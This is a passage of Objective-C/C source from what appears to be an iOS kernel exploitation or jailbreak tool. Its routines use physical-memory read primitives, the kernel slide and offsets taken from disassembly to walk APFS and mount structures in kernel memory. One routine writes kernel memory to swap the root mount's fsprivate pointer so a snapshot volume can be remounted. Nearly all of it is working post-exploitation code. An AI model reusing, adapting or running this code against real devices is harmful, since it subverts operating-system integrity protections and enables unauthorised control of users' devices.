    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build65 discovery done mount_ready=%d", g->mount_ready]];
}

typedef struct {
    uint64_t ptr;
    char src[32];
    bool heap;
    bool q48_ok;
    uint64_t q48;
} dt_build66_vol_sb_cand_t;

static void dt_build66_push_vol_sb_cand(dt_build66_vol_sb_cand_t *cands, unsigned *count,
    uint64_t ptr, const char *src, void (^log)(NSString *line));

typedef struct {
    int slot;
    uint64_t apfs;
    uint64_t vol_sb;
    uint64_t container;
    bool backlink;
    bool heap_vol;
    bool heap_container;
} dt_build76_neighbor_t;

static bool dt_build76_apfs_heap_obj_plausible(uint64_t apfs)
{
    return dt_build43_kptr_is_heap(apfs);
}

static void dt_build76_read_outer_shell_fields(dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!g || !dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        return;

    g->outer_d0 = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_CONTAINER,
        "build76 outer+0xD0", log);
    g->outer_backlink = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_MAIN_APFS,
        "build76 outer+0x138", log);
    g->outer_mount_mp = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_MOUNT_MP,
        "build76 outer+0x2D0", log);
    uint64_t state = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_STATE_QWORD,
        "build76 outer+0x120", log);
    g->outer_mounted_bit = (state & 0x40ULL) != 0;
}

/// IDA §22 hollow shell: +0xC0/+0xD0 never wired @ 0x9db020; handle_mount @ 0x9e08c4 replaces when boot wins.
static void dt_build76_classify_fsprivate(dt_apfs_graph_t *g)
{
    if (!g)
        return;

    bool c0_ok = dt_build68_vol_sb_ptr_valid(g->vol_sb_outer);
    bool d0_ok = dt_build36_kern_kptr_valid(g->outer_d0, 0);

    if (c0_ok && d0_ok) {
        if (dt_build43_kptr_is_heap(g->vol_sb_outer))
            strlcpy(g->fsprivate_class, "wired", sizeof(g->fsprivate_class));
        else
            strlcpy(g->fsprivate_class, "wired_static_c0", sizeof(g->fsprivate_class));
    } else if (!c0_ok && !d0_ok)
        strlcpy(g->fsprivate_class, "hollow", sizeof(g->fsprivate_class));
    else if (c0_ok)
        strlcpy(g->fsprivate_class, "partial_c0", sizeof(g->fsprivate_class));
    else
        strlcpy(g->fsprivate_class, "partial_d0", sizeof(g->fsprivate_class));
}

/// build76: scan ±N adjacent 0x21B8 apfs objects for live +0xC0/+0xD0 pairs (hollow-root recovery).
static unsigned dt_build76_neighbor_pair_scan(uint64_t outer, dt_build76_neighbor_t *out,
    unsigned max_out, void (^log)(NSString *line))
{
    unsigned found = 0;
    if (!out || max_out == 0 || !dt_build36_kern_kptr_valid(outer, 0))
        return 0;

    DTPhysLog(log,
        @"[*] build76 neighbor scan ±%u slots (0x%x) for +0xC0/+0xD0 pairs near outer=0x%llx",
        DT_BUILD76_NEIGHBOR_SCAN_SLOTS, DT_BUILD66_APFS_OBJ_SIZE, outer);
    [[DTRunLogger shared] logStage:@"build76 neighbor pair scan begin"];

    for (int i = -(int)DT_BUILD76_NEIGHBOR_SCAN_SLOTS; i <= (int)DT_BUILD76_NEIGHBOR_SCAN_SLOTS; i++) {
        if (i == 0)
            continue;
        uint64_t apfs = (uint64_t)((int64_t)outer + (int64_t)i * (int64_t)DT_BUILD66_APFS_OBJ_SIZE);
        if (!dt_build76_apfs_heap_obj_plausible(apfs))
            continue;

        uint64_t vol_sb = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_SB, "build76 n+0xC0", log);
        uint64_t container = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CONTAINER, "build76 n+0xD0", log);
        if (!dt_build68_vol_sb_ptr_valid(vol_sb) || !dt_build36_kern_kptr_valid(container, 0))
            continue;

        uint64_t main_ptr = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_MAIN_APFS, "build76 n+0x138", log);
        bool backlink = (main_ptr == outer);

        if (found < max_out) {
            out[found++] = (dt_build76_neighbor_t){
                .slot = i,
                .apfs = apfs,
                .vol_sb = vol_sb,
                .container = container,
                .backlink = backlink,
                .heap_vol = dt_build43_kptr_is_heap(vol_sb),
                .heap_container = dt_build43_kptr_is_heap(container),
            };
        }

        DTPhysLog(log,
            @"[*] build76 neighbor[%+d] apfs=0x%llx backlink=%d +0xC0=0x%llx(%s) +0xD0=0x%llx(%s)",
            i, apfs, backlink, vol_sb, dt_build38_kptr_class(vol_sb),
            container, dt_build38_kptr_class(container));
    }

    DTPhysLog(log, @"[*] build76 neighbor pair scan hits=%u", found);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build76 neighbor hits=%u", found]];
    return found;
}

static const dt_build76_neighbor_t *dt_build76_pick_best_neighbor(const dt_build76_neighbor_t *hits,
    unsigned count)
{
    const dt_build76_neighbor_t *best = NULL;
    int best_score = -1;

    for (unsigned i = 0; i < count; i++) {
        int score = 0;
        if (hits[i].backlink)
            score += 100;
        if (hits[i].heap_vol)
            score += 10;
        if (hits[i].heap_container)
            score += 10;
        if (score > best_score) {
            best_score = score;
            best = &hits[i];
        }
    }
    return best;
}

static void dt_build76_neighbor_compute_stats(const dt_build76_neighbor_t *hits, unsigned count,
    unsigned *adjacent, int *best_slot)
{
    if (adjacent)
        *adjacent = 0;
    if (best_slot)
        *best_slot = 0;

    const dt_build76_neighbor_t *best = dt_build76_pick_best_neighbor(hits, count);
    if (best && best_slot)
        *best_slot = best->slot;

    if (!adjacent)
        return;
    for (unsigned i = 0; i < count; i++) {
        int slot = hits[i].slot;
        if (slot >= -1 && slot <= 1)
            (*adjacent)++;
    }
}

/// Single-line device test report (grep: `[build76 TEST]`). Maps to BUILD76_IDA_FULL_TRACE §14 / CONTINUATION §22.
static void dt_build76_log_test_report(const dt_apfs_graph_t *g, const char *remount_tag,
    void (^log)(NSString *line))
{
    if (!g)
        return;

    const char *orphan = "n/a";
    if (strcmp(g->fsprivate_class, "hollow") == 0) {
        if (g->neighbor_adjacent_hits > 0)
            orphan = "likely_obj_get_adjacent";
        else if (g->neighbor_hits > 0)
            orphan = "neighbor_not_adjacent";
        else
            orphan = "no_neighbor_pair";
    }

    DTPhysLog(log,
        @"[build76 TEST] fsprivate_class=%s outer=0x%llx(%s) +0xC0=0x%llx(%s) +0xD0=0x%llx(%s) "
        "+0x138=0x%llx +0x2D0=0x%llx mounted_bit=%d os.update=%d "
        "mounted_match=0x%llx(%s) src=%s mp=0x%llx applied=%d "
        "container=0x%llx(%s) src=%s child=0x%llx(%s) "
        "neighbor_hits=%u adjacent_hits=%u best_slot=%+d backlink_hits=%u vollist=%u "
        "graft=0x%llx(%s) mount_ready=%d failure_mode=%s orphan_hypothesis=%s remount=%s",
        g->fsprivate_class, g->mnt_outer, dt_build38_kptr_class(g->mnt_outer),
        g->vol_sb_outer, dt_build38_kptr_class(g->vol_sb_outer),
        g->outer_d0, dt_build38_kptr_class(g->outer_d0),
        g->outer_backlink, g->outer_mount_mp, g->outer_mounted_bit ? 1 : 0, g->os_update ? 1 : 0,
        g->mounted_match_apfs, dt_build38_kptr_class(g->mounted_match_apfs),
        g->mounted_match_src, g->mounted_match_mp, g->mounted_match_applied ? 1 : 0,
        g->container, dt_build38_kptr_class(g->container), g->container_src,
        g->snap_child, dt_build38_kptr_class(g->snap_child),
        g->neighbor_hits, g->neighbor_adjacent_hits, g->neighbor_best_slot,
        g->backlink_hits, g->vollist_scanned,
        g->vol_sb_graft, g->vol_sb_graft_src,
        g->mount_ready ? 1 : 0, g->failure_mode, orphan,
        remount_tag ? remount_tag : "pending");

    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build76 TEST %s neighbor=%u adj=%u mount_ready=%d mode=%s remount=%s",
        g->fsprivate_class, g->neighbor_hits, g->neighbor_adjacent_hits,
        g->mount_ready ? 1 : 0, g->failure_mode, remount_tag ? remount_tag : "pending"]];
}

static void dt_build76_apply_neighbor_hits(dt_apfs_graph_t *g, const dt_build76_neighbor_t *hits,
    unsigned count, dt_build66_vol_sb_cand_t *vol_cands, unsigned *vol_count, void (^log)(NSString *line))
{
    const dt_build76_neighbor_t *best = dt_build76_pick_best_neighbor(hits, count);
    if (!best)
        return;

    if (!dt_build36_kern_kptr_valid(g->snap_child, 0) && best->backlink) {
        g->snap_child = best->apfs;
        strlcpy(g->child_src, "build76 neighbor backlink", sizeof(g->child_src));
        dt_build65_resolve_child_vol_sb(g, log);
        DTPhysLog(log, @"[+] build76 snap_child from neighbor[%+d] backlink apfs=0x%llx",
            best->slot, best->apfs);
        [[DTRunLogger shared] logStage:@"build76 snap_child from neighbor"];
    }

    if (!dt_build43_kptr_is_heap(g->container) && dt_build43_kptr_is_heap(best->container)) {
        g->container = best->container;
        strlcpy(g->container_src, "build76 neighbor+0xD0", sizeof(g->container_src));
        DTPhysLog(log, @"[+] build76 container from neighbor[%+d] +0xD0=0x%llx(%s)",
            best->slot, best->container, dt_build38_kptr_class(best->container));
        [[DTRunLogger shared] logStage:@"build76 container from neighbor"];
    }

    for (unsigned i = 0; i < count; i++) {
        char src[32];
        snprintf(src, sizeof(src), "neighbor[%+d]+0xC0", hits[i].slot);
        dt_build66_push_vol_sb_cand(vol_cands, vol_count, hits[i].vol_sb, src, log);
    }
}

static uint32_t dt_build80_vnode_specrdev(uint64_t vp, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(vp, 0))
        return 0;

    uint64_t specinfo = dt_build38_read_u64_dual(vp + DT_BAKED_VNODE_SPECINFO,
        "build81 vnode+0x78", log);
    if (!dt_build36_kern_kptr_valid(specinfo, 0))
        return 0;
    return dt_build38_read_u32_dual(specinfo + DT_BAKED_SPECINFO_DEV,
        "build81 vnode_specrdev", log);
}

/// Mirrors APFS's mounted-volume matcher sub_FFFFFFF0069E45AC:
/// vfs_statfs(mp)->f_fsid must match, or apfs+0x2D8's vnode_specrdev must match fsid[0].
static bool dt_build80_mount_matches_root(uint64_t mp, uint32_t target_fsid0, uint32_t target_fsid1,
    uint64_t apfs, uint32_t *out_dev, const char **out_reason, void (^log)(NSString *line))
{
    uint32_t fsid1 = dt_build38_read_u32_dual(mp + DT_BAKED_MOUNT_STATFS_FSID1,
        "build80 mp fsid[1]", log);
    if (fsid1 != target_fsid1)
        return false;

    uint32_t fsid0 = dt_build38_read_u32_dual(mp + DT_BAKED_MOUNT_STATFS_FSID0,
        "build80 mp fsid[0]", log);
    if (fsid0 == target_fsid0) {
        if (out_dev)
            *out_dev = 0;
        if (out_reason)
            *out_reason = "fsid";
        return true;
    }

    uint64_t devvp = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_DEVVP,
        "build80 apfs+0x2D8 devvp", log);
    uint32_t dev = dt_build80_vnode_specrdev(devvp, log);
    if (out_dev)
        *out_dev = dev;
    if (dev != 0 && dev == target_fsid0) {
        if (out_reason)
            *out_reason = "dev";
        return true;
    }

    return false;
}

static bool dt_build80_apfs_wired_for_remount(uint64_t apfs, uint64_t *out_vol_sb,
    uint64_t *out_container, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(apfs, 0))
        return false;

    uint64_t vol_sb = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_SB,
        "build80 candidate+0xC0", log);
    uint64_t container = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CONTAINER,
        "build80 candidate+0xD0", log);
    if (out_vol_sb)
        *out_vol_sb = vol_sb;
    if (out_container)
        *out_container = container;

    return dt_build68_vol_sb_ptr_valid(vol_sb) && dt_build36_kern_kptr_valid(container, 0);
}

static bool dt_build80_find_mounted_fsprivate_match(const dt_build38_chain_t *chain,
    dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!chain || !g || !g->os_update)
        return false;

    uint64_t list_head_slot = gSystemInfo.kernelConstant.slide + DT_BAKED_MOUNTLIST_UNSLID;
    uint64_t mp = dt_build38_read_u64_dual(list_head_slot, "build80 mountlist", log);
    if (!dt_build36_kern_kptr_valid(mp, list_head_slot)) {
        DTPhysLog(log, @"[*] build80 mounted-fsprivate matcher skip — mountlist head invalid 0x%llx", mp);
        [[DTRunLogger shared] logStage:@"build80 mounted matcher no mountlist"];
        return false;
    }

    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    (void)o;
    /* IDA apfs_vfsop_mount @ 0x9d9f78 MOV X21,X1 (mount vnode); @ 0x9da698 BL vnode_specrdev on X21. */
    uint32_t target_fsid0 = 0;
    if (dt_build36_kern_kptr_valid(chain->root_vp, 0))
        target_fsid0 = dt_build80_vnode_specrdev(chain->root_vp, log);
    if (target_fsid0 == 0)
        target_fsid0 = dt_build38_read_u32_dual(chain->mount_mp + DT_BAKED_MOUNT_STATFS_FSID0,
            "build81 root fsid[0] fallback", log);
    uint64_t root_typeinfo = dt_build38_read_u64_dual(chain->mount_mp + DT_BAKED_MOUNT_TYPEINFO,
        "build80 root mount+0x30 typeinfo", log);
    uint32_t target_fsid1 = 0;
    if (dt_build36_kern_kptr_valid(root_typeinfo, 0))
        target_fsid1 = dt_build38_read_u32_dual(root_typeinfo + DT_BAKED_APFS_TYPENUM,
            "build80 root vfs_typenum", log);
    if (target_fsid1 == 0)
        target_fsid1 = dt_build38_read_u32_dual(chain->mount_mp + DT_BAKED_MOUNT_STATFS_FSID1,
            "build80 root fsid[1] fallback", log);

    DTPhysLog(log,
        @"[*] build81 mounted-fsprivate matcher begin root_mp=0x%llx root_vp=0x%llx root_typeinfo=0x%llx target={dev=0x%x,type=0x%x} "
        "(IDA callsite @ 0x9da698 + matcher @ 0x9e45ac)",
        chain->mount_mp, chain->root_vp, root_typeinfo, target_fsid0, target_fsid1);
    [[DTRunLogger shared] logStage:@"build81 mounted matcher begin"];

    for (unsigned i = 0; i < DT_BUILD80_MAX_MOUNT_WALK && dt_build36_kern_kptr_valid(mp, 0); i++) {
        uint64_t apfs = dt_build38_read_u64_dual(mp + DT_BAKED_MOUNT_FSPRIVATE,
            "build80 candidate mnt_data+0x8F8", log);
        uint32_t dev = 0;
        const char *reason = "none";

        if (dt_build36_kern_kptr_valid(apfs, 0) &&
            dt_build80_mount_matches_root(mp, target_fsid0, target_fsid1, apfs, &dev, &reason, log)) {
            uint64_t vol_sb = 0;
            uint64_t container = 0;
            bool wired = dt_build80_apfs_wired_for_remount(apfs, &vol_sb, &container, log);

            DTPhysLog(log,
                @"[*] build80 mount[%u] mp=0x%llx apfs=0x%llx(%s) match=%s dev=0x%x "
                "+0xC0=0x%llx(%s) +0xD0=0x%llx(%s) wired=%d",
                i, mp, apfs, dt_build38_kptr_class(apfs), reason, dev,
                vol_sb, dt_build38_kptr_class(vol_sb),
                container, dt_build38_kptr_class(container), wired ? 1 : 0);

            if (wired && apfs != chain->apfs) {
                g->mounted_match_mp = mp;
                g->mounted_match_apfs = apfs;
                g->mounted_match_vol_sb = vol_sb;
                g->mounted_match_container = container;
                g->mounted_match_fsid0 = target_fsid0;
                g->mounted_match_fsid1 = target_fsid1;
                g->mounted_match_dev = dev;
                strlcpy(g->mounted_match_src, reason, sizeof(g->mounted_match_src));
                [[DTRunLogger shared] logStage:@"build80 mounted matcher donor found"];
                return true;
            }
        }

        uint64_t next = dt_build38_read_u64_dual(mp + DT_BAKED_MOUNT_LIST_NEXT,
            "build80 mount next", log);
        if (next == mp)
            break;
        mp = next;
    }

    DTPhysLog(log, @"[*] build80 mounted-fsprivate matcher no wired donor found");
    [[DTRunLogger shared] logStage:@"build80 mounted matcher no donor"];
    return false;
}

static void dt_build80_refresh_graph_from_current_fsprivate(dt_apfs_graph_t *g,
    void (^log)(NSString *line))
{
    if (!g || !dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        return;

    g->snap_child = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_MAIN_APFS,
        "build80 current+0x138", log);
    if (g->snap_child == g->mnt_outer)
        g->snap_child = 0;
    if (dt_build36_kern_kptr_valid(g->snap_child, 0))
        strlcpy(g->child_src, "build80 current+0x138", sizeof(g->child_src));

    g->vol_sb_outer = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_VOL_SB,
        "build80 current+0xC0", log);
    g->container = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_CONTAINER,
        "build80 current+0xD0", log);
    strlcpy(g->container_src, "build80 mounted fsprivate", sizeof(g->container_src));
    dt_build65_resolve_child_vol_sb(g, log);
    dt_build76_read_outer_shell_fields(g, log);
    dt_build76_classify_fsprivate(g);
    dt_build68_compute_mount_ready(g, log);
    dt_build66_classify_failure(g);
}

static int dt_build80_try_mount_fsprivate_swap(const dt_build38_chain_t *chain,
    dt_apfs_graph_t *g, uint64_t *out_prev_fsprivate, bool *out_applied,
    void (^log)(NSString *line))
{
    if (out_prev_fsprivate)
        *out_prev_fsprivate = 0;
    if (out_applied)
        *out_applied = false;
    if (!chain || !g || !g->os_update)
        return 0;

    if (!dt_build80_find_mounted_fsprivate_match(chain, g, log))
        return 0;

    uint64_t prev = dt_build38_read_u64_dual(chain->mount_mp + DT_BAKED_MOUNT_FSPRIVATE,
        "build80 root mnt_data+0x8F8 pre-swap", log);
    if (prev == g->mounted_match_apfs) {
        g->mnt_outer = prev;
        dt_build80_refresh_graph_from_current_fsprivate(g, log);
        return 0;
    }

    DTPhysLog(log,
        @"[*] build80 mounted-fsprivate swap root mount+0x8F8 0x%llx(%s) -> 0x%llx(%s) "
        "from mp=0x%llx match=%s (IDA _vfs_setfsprivate STR @ mount+0x8F8 @ 0xfffffff007374884)",
        prev, dt_build38_kptr_class(prev),
        g->mounted_match_apfs, dt_build38_kptr_class(g->mounted_match_apfs),
        g->mounted_match_mp, g->mounted_match_src);
    [[DTRunLogger shared] logStage:@"build80 mounted fsprivate swap try"];

    int r = dt_phys_write64_va(chain->mount_mp + DT_BAKED_MOUNT_FSPRIVATE,
        g->mounted_match_apfs, "build80 root mount+0x8F8 fsprivate swap", log);
    if (r != 0)
        return r;

    if (out_prev_fsprivate)
        *out_prev_fsprivate = prev;
    if (out_applied)
        *out_applied = true;
    g->mounted_match_applied = true;
    g->mnt_outer = g->mounted_match_apfs;
    g->vol_sb_outer = g->mounted_match_vol_sb;
    g->container = g->mounted_match_container;
    strlcpy(g->container_src, "build80 mounted fsprivate", sizeof(g->container_src));

    dt_build80_refresh_graph_from_current_fsprivate(g, log);
    dt_build62_log_graph(g, "post-mounted-fsprivate-swap", log);
    dt_build76_log_test_report(g, "post-mounted-swap", log);
    [[DTRunLogger shared] logStage:@"build80 mounted fsprivate swap applied"];
    return 0;
}

/// After mount+0x8F8 swap, refresh chain.apfs/apfs_eff/container from graph.mnt_outer (IDA fsprivate @ 0x7374830).
static void dt_build81_sync_chain_from_graph(dt_build38_chain_t *chain, const dt_apfs_graph_t *g,
    void (^log)(NSString *line))
{
    if (!chain || !g || !dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        return;

    chain->apfs = g->mnt_outer;
    chain->apfs_eff = dt_build38_apfs_eff(chain->apfs, &chain->apfs_main, log);
    chain->container = dt_build38_read_u64_dual(chain->apfs_eff + DT_BAKED_APFS_CONTAINER,
        "build81 chain sync eff+0xD0", log);
    DTPhysLog(log,
        @"[*] build81 chain sync apfs=0x%llx(%s) apfs_eff=0x%llx container=0x%llx(%s)",
        chain->apfs, dt_build38_kptr_class(chain->apfs),
        chain->apfs_eff, chain->container, dt_build38_kptr_class(chain->container));
    [[DTRunLogger shared] logStage:@"build81 chain sync post-fsprivate"];
}

static void dt_build68_compute_mount_ready(dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    bool container_ok = dt_build36_kern_kptr_valid(g->container, 0);
    bool heap_container = dt_build43_kptr_is_heap(g->container);
    bool heap_child = dt_build43_kptr_is_heap(g->snap_child);
    bool vol_outer_ok = dt_build68_vol_sb_ptr_valid(g->vol_sb_outer);
    bool vol_child_ok = dt_build68_vol_sb_ptr_valid(g->vol_sb_child);
    bool vol_graft_ok = dt_build68_vol_sb_ptr_valid(g->vol_sb_graft);

    if (g->os_update) {
        if (!heap_container) {
            g->mount_ready = false;
            DTPhysLog(log,
                @"[*] build78 os.update mount_ready=0 — no heap container (have=0x%llx %s)",
                g->container, dt_build38_kptr_class(g->container));
            [[DTRunLogger shared] logStage:@"build78 os.update no heap container"];
            return;
        }
        if (vol_outer_ok && dt_build43_kptr_is_heap(g->vol_sb_outer)) {
            g->mount_ready = true;
            DTPhysLog(log,
                @"[*] build77 os.update mount_ready=1 — heap outer+0xC0=0x%llx container=0x%llx(%s) (IDA @ 0x9da970)",
                g->vol_sb_outer, g->container, dt_build38_kptr_class(g->container));
            [[DTRunLogger shared] logStage:@"build77 os.update mount_ready heap vol_sb"];
            return;
        }
        if (vol_outer_ok && dt_build77_osupdate_vol_sb_link_fix_needed(g)) {
            g->mount_ready = false;
            uint64_t link = vol_graft_ok ? g->vol_sb_graft : g->vol_sb_child;
            const char *src = vol_graft_ok ? g->vol_sb_graft_src : g->vol_sb_child_src;
            DTPhysLog(log,
                @"[*] build77 os.update mount_ready=0 — static outer+0xC0=0x%llx needs link-fix → 0x%llx(%s) src=%s",
                g->vol_sb_outer, link, dt_build38_kptr_class(link), src);
            [[DTRunLogger shared] logStage:@"build77 os.update static C0 link-fix pending"];
            return;
        }
        if (vol_child_ok || vol_graft_ok) {
            g->mount_ready = false;
            uint64_t link = vol_child_ok ? g->vol_sb_child : g->vol_sb_graft;
            const char *src = vol_child_ok ? g->vol_sb_child_src : g->vol_sb_graft_src;
            DTPhysLog(log,
                @"[*] build76 os.update mount_ready=0 — link-fix pending vol_sb=0x%llx(%s) src=%s container=0x%llx(%s)",
                link, dt_build38_kptr_class(link), src,
                g->container, dt_build38_kptr_class(g->container));
            [[DTRunLogger shared] logStage:@"build76 os.update link-fix pending"];
            return;
        }
        if (!heap_child) {
            g->mount_ready = false;
            DTPhysLog(log,
                @"[*] build76 os.update mount_ready=0 — no vol_sb (container=0x%llx(%s) heap=%d)",
                g->container, dt_build38_kptr_class(g->container), heap_container ? 1 : 0);
            [[DTRunLogger shared] logStage:@"build76 os.update blocked no vol_sb"];
            return;
        }
        g->mount_ready = false;
        DTPhysLog(log, @"[*] build76 os.update mount_ready=0 — no vol_sb at outer+0xC0 or child+0xC0");
        [[DTRunLogger shared] logStage:@"build76 os.update no vol_sb"];
        return;
    }

    g->mount_ready = container_ok && vol_outer_ok;
    (void)heap_container;
}

static bool dt_build67_vol_sb_src_is_nx(const char *src)
{
    return src && strstr(src, "nx") != NULL;
}

static void dt_build66_log_apfs_compact(uint64_t apfs, const char *tag, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(apfs, 0))
        return;
    DTPhysLog(log,
        @"[*] build66 %s apfs=0x%llx(%s) +0x138=0x%llx +0x2D8=0x%llx +0xC0=0x%llx(%s) +0xD8=0x%llx(%s) +0xD0=0x%llx(%s)",
        tag, apfs, dt_build38_kptr_class(apfs),
        dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_MAIN_APFS, "b66+138", log),
        dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_ID, "b66+2D8", log),
        dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_SB, "b66+C0", log),
        dt_build38_kptr_class(dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_SB, "b66+C0c", log)),
        dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CHILD_VOL_SB, "b66+D8", log),
        dt_build38_kptr_class(dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CHILD_VOL_SB, "b66+D8c", log)),
        dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CONTAINER, "b66+D0", log),
        dt_build38_kptr_class(dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CONTAINER, "b66+D0c", log)));
}

static void dt_build66_log_container_forensics(uint64_t container, dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(container, 0))
        return;

    uint64_t raw_head = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_VOL_LIST,
        "build66 container+0x1F0 raw", log);
    uint64_t tail = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_VOL_LIST_TAIL,
        "build66 container+0x1F8 tail", log);
    if (g) {
        g->container_vol_head_raw = raw_head;
        g->container_vol_tail = tail;
    }

    DTPhysLog(log,
        @"[*] build66 container forensics 0x%llx(%s) +0x1F0=0x%llx(%s) +0x1F8=0x%llx(%s) +0xC0=0x%llx +0xC8=0x%llx +0x13C=%u +0x144=%u",
        container, dt_build38_kptr_class(container),
        raw_head, dt_build38_kptr_class(raw_head),
        tail, dt_build38_kptr_class(tail),
        dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_NX_SB, "b66 cnxc0", log),
        dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_NX_SB_BUF, "b66 cnxc8", log),
        dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_MU_GATE, "b66 mu", log),
        dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_REMAP, "b66 remap", log));
    [[DTRunLogger shared] logStage:@"build66 container forensics"];
}

static bool dt_build66_walk_vollist_tail(uint64_t container, uint64_t outer, uint64_t outer_vol_id,
    uint64_t *out_child, char *out_reason, size_t reason_len, unsigned *out_entries,
    void (^log)(NSString *line))
{
    if (out_child)
        *out_child = 0;
    if (!dt_build43_kptr_is_heap(container))
        return false;

    uint64_t tail = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_VOL_LIST_TAIL,
        "build66 tail+0x1F8", log);
    if (!dt_build36_kern_kptr_valid(tail, 0)) {
        DTPhysLog(log, @"[*] build66 tail walk skip — container+0x1F8 not kptr (0x%llx)", tail);
        return false;
    }

    DTPhysLog(log,
        @"[*] build66 tail reverse walk from 0x%llx (IDA handle_mount tail @ 0x9e0b9c prev @ +0x338)",
        tail);
    [[DTRunLogger shared] logStage:@"build66 tail reverse walk begin"];

    uint64_t entry = tail;
    uint64_t dev_match = 0;
    char dev_reason[64] = {0};

    for (unsigned i = 0; i < DT_BUILD66_MAX_TAIL_WALK && dt_build36_kern_kptr_valid(entry, 0); i++) {
        if (out_entries)
            (*out_entries)++;
        dt_build66_log_apfs_compact(entry, "tail", log);

        uint64_t main_ptr = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_MAIN_APFS,
            "build66 tail+0x138", log);
        uint64_t vol_id = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_ID,
            "build66 tail+0x2D8", log);

        if (main_ptr == outer) {
            if (out_child)
                *out_child = entry;
            if (out_reason && reason_len > 0)
                snprintf(out_reason, reason_len, "tail[%u]+0x138==outer", i);
            DTPhysLog(log, @"[+] build66 tail child=0x%llx via +0x138==outer", entry);
            [[DTRunLogger shared] logStage:@"build66 tail child via +0x138"];
            return true;
        }
        if (vol_id == outer_vol_id && entry != outer && !dev_match) {
            dev_match = entry;
            snprintf(dev_reason, sizeof(dev_reason), "tail[%u]+0x2D8 dev", i);
        }

        uint64_t prev = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_LIST_PREV,
            "build66 tail+0x338", log);
        if (!dt_build36_kern_kptr_valid(prev, 0) || prev == entry)
            break;
        entry = prev;
    }

    if (dev_match) {
        if (out_child)
            *out_child = dev_match;
        if (out_reason && reason_len > 0)
            strlcpy(out_reason, dev_reason, reason_len);
        [[DTRunLogger shared] logStage:@"build66 tail child via +0x2D8"];
        return true;
    }

    [[DTRunLogger shared] logStage:@"build66 tail walk no child"];
    return false;
}

static unsigned dt_build66_backlink_scan(uint64_t outer, uint64_t *out_apfs, unsigned max_out,
    void (^log)(NSString *line))
{
    unsigned found = 0;
    if (!dt_build36_kern_kptr_valid(outer, 0))
        return 0;

    DTPhysLog(log,
        @"[*] build66 backlink scan ±%u apfs slots (0x%x stride) for +0x138==0x%llx (IDA handle_snapshot @ 0x9e0154)",
        DT_BUILD66_BACKLINK_SCAN_SLOTS, DT_BUILD66_APFS_OBJ_SIZE, outer);
    [[DTRunLogger shared] logStage:@"build66 backlink scan begin"];

    for (int i = -((int)DT_BUILD66_BACKLINK_SCAN_SLOTS); i <= (int)DT_BUILD66_BACKLINK_SCAN_SLOTS; i++) {
        if (i == 0)
            continue;
        int64_t delta = (int64_t)i * (int64_t)DT_BUILD66_APFS_OBJ_SIZE;
        uint64_t apfs = (uint64_t)((int64_t)outer + delta);
        if (!dt_build36_kern_kptr_valid(apfs, 0))
            continue;

        uint64_t main_ptr = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_MAIN_APFS,
            "build66 scan+0x138", log);
        if (main_ptr != outer)
            continue;

        char tag[32];
        snprintf(tag, sizeof(tag), "backlink[%+d]", i);
        dt_build66_log_apfs_compact(apfs, tag, log);
        if (found < max_out)
            out_apfs[found++] = apfs;
    }

    DTPhysLog(log, @"[*] build66 backlink scan hits=%u", found);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build66 backlink hits=%u", found]];
    return found;
}

/// IDA revert_to_snapshot @ 0x9744f0: vol_sb from vollist entry+0xC0; walk @ 0x9743dc (+0x2D8 match, +0x330 next).
static void dt_build69_push_vollist_entry_vol_sb(uint64_t entry, const char *tag, unsigned idx,
    bool preferred, dt_build66_vol_sb_cand_t *cands, unsigned *count, void (^log)(NSString *line))
{
    uint64_t vol_c0 = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_SB,
        "build69 vollist+0xC0", log);
    if (!dt_build68_vol_sb_ptr_valid(vol_c0))
        return;

    char src[32];
    snprintf(src, sizeof(src), "%s[%u]+0xC0%s", tag, idx, preferred ? " match" : "");
    dt_build66_push_vol_sb_cand(cands, count, vol_c0, src, log);
}

